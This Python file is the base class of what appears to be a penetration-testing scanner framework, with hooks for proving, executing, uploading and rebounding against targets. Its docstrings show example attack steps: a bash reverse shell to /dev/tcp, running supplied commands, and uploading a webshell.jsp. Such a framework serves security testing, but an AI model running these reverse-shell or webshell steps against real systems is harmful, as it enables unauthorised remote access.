#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author = 'orleven'

import os
import sys
import socks
import socket
import urllib.parse
from lib.api.api import _ceye_dns_api
from lib.api.api import _ceye_verify_api
from lib.core.data import conf
from lib.core.data import logger
from lib.utils.curl import curl
from lib.utils.curl import geturl
from lib.core.enums import SERVER_PORT_MAP

class Script(object):
    def __init__(self, target=None, server_type=SERVER_PORT_MAP.WEB, parameter=None):
        self.server_type = server_type

        # in dev ...
        # self.script_type = script_type

        self.target_port_list = []
        self.initialize_target(target)
        self.initialize_parameter(parameter)
        self.target = target

        self.parameter = {}
        self.url = self.base_url = None
        self.req = []
        self.res = []
        self.other = {}

    def prove(self):
        """subclass should override this function for prove
            demo:
                if vul:
                    self.flag = 1
                    self.req.append({"test": test})                     # for recode the request' info to database
                    self.res.append({"info": test, "key": "test"})      # for recode the response' info to database and show info, key to console.
        """
        pass

    def exec(self):
        """subclass should override this function for exec
            use self.parameter['cmd'] by -p cmd=whoami
            demo:
                res = os.system(self.parameter['cmd'])
                if vul:
                    self.flag = 1
                    self.req.append({"test": test})                      # for recode the request' info to database
                    self.res.append({"info": test, "key": "test"})       # for recode the response' info to database and show info, key to console.
        """
        pass

    def upload(self):
        """subclass should override this function for upload
            use self.parameter['srcpath'] and self.parameter['despath'] by -p srcpath=webshell.jsp&despath=test.jsp
            demo:
                srcpath = self.parameter['srcpath']
                despath = self.parameter['despath']
                ... upload srcpath to despath...
                if vul:
                    self.flag = 1
                    self.req.append({"test": srcpath})                # for recode the request' info to database
                    self.res.append({"info": despath, "key": "test"}) # for recode the response' info to database and show info, key to console.
        """
        pass

    def rebound(self):
        """subclass should override this function for upload
            use self.parameter['local_host'] and self.parameter['local_port'] by -p local_host=192.168.1.3&local_port=4444
            demo:
                local_host = self.parameter['local_host']
                local_port = self.parameter['local_port']
                cmd = '/bin/bash -i >& /dev/tcp/{ip}/{port} 0>&1'.format(ip=local_host, port=local_port)
                res = os.system(cmd)
                if vul:
                    self.flag = 1
                    self.req.append({"test": cmd})                      # for recode the request' info to database
                    self.res.append({"info": 'success', "key": "test"}) # for recode the response' info to database and show info, key to console.
        """
        pass

    def get_url(self):
        if not self.url:
            self.base_url = self.url = geturl(self.target_host, self.target_port)

    def re_initialize(self,target, host, port, parameter):
        self.target_host = host
        self.target_port = port
        self.parameter = parameter

        if target.startswith('http://') or target.startswith('https://'):
            self.url = target
            protocol, s1 = urllib.parse.splittype(target)
            host, s2 = urllib.parse.splithost(s1)
            host, port = urllib.parse.splitport(host)
            self.target_host = host
            self.target_port = int(port) if port != None and port != 0 else 443 if protocol == 'https' else 80
            _ = target[9:].find('/')
            if _ == -1 :
                self.url += '/'
                self.base_url = self.url
            else:
                self.base_url = self.url[:_ + 10]

        self.flag = -1
        self.req = []
        self.res = []
        self.other = {}

    def initialize_parameter(self,parameter):
        if parameter != None:
            for _key, _val in parameter.items():
                if _key in self.__dict__.keys():
                    logger.warning("This parameter name has already been used: %s = %s" % (_key, _val))
                    logger.warning("And using this parameter name will cause the original value to be overwritten.")
                    self.parameter[_key] = _val

    def initialize_target(self, target):
        if target :
            if target.startswith('http://') or target.startswith('https://'):
                self.url = target
                protocol, s1 = urllib.parse.splittype(target)
                host, s2 = urllib.parse.splithost(s1)
                host, port = urllib.parse.splitport(host)
                self.target_host = host
                self.target_port = int(port) if port != None and port!= 0 else 443 if protocol == 'https' else 80
                _ = target[9:].find('/')
                if _ == -1:
                    self.url += '/'
                    self.base_url = self.url
                else:
                    self.base_url = self.url[:_ + 10]
            else:
                if ":" in target:
                    _v = target.split(':')
                    host, port = _v[0], _v[1]
                    self.target_host = host
                else:
                    port = 0
                    self.target_host = target

                try:
                    self.target_port = int(port)
                except:
                    self.target_port = 80

            return True
        else:
            return False

    def get_target_port_list(self):

        if self.target_port == None:
            if isinstance(self.server_type, list):
                for port in self.server_type:
                    self.target_port_list.append((None, port))
            else:
                if self.server_type:
                    self.target_port = self.server_type
                    self.target_port_list.append((self.target, self.server_type))
                else:
                    return []

        elif isinstance(self.target_port,int):
            if self.target_port !=0:
                self.target_port = self.target_port
                self.target_port_list.append((self.target, self.target_port))
            else:
                if isinstance(self.server_type,list):
                    for port in self.server_type:
                        self.target_port_list.append((None, port))
                else:
                    if self.server_type:
                        self.target_port = self.server_type
                        self.target_port_list.append((self.target, self.server_type))
                    else:
                        return []

        elif isinstance(self.target_port,list):
            for port in self.target_port:
                self.target_port_list.append((self.target, port))

        else:
            return []

        return self.target_port_list

    def curl(self, method, url, params=None, **kwargs):
        return curl(method, url, params=params, **kwargs)


    def read_file(self, filename, type = 'r'):
        if os.path.isfile(filename):
            with open(filename, type) as f:
                return f.readlines()
        logger.error("File is not exist: %s" %filename)
        return None

    def ceye_dns_api(self, t='url'):
        '''
        curl ssrf
        :param t:
        :return:
        '''
        return _ceye_dns_api(t=t)

    def ceye_verify_api(self, filter, t='dns'):
        '''
        verify ssrf
        :param filter:
        :param t:
        :return:
        '''
        return _ceye_verify_api(filter=filter, t=t)

    def url_normpath(self, base, url):
        from urllib.parse import urljoin
        from urllib.parse import urlparse
        from urllib.parse import urlunparse
        from posixpath import normpath
        url1 = urljoin(base, url)
        arr = urlparse(url1)
        path = normpath(arr[2])
        return urlunparse((arr.scheme, arr.netloc, path, arr.params, arr.query, arr.fragment))

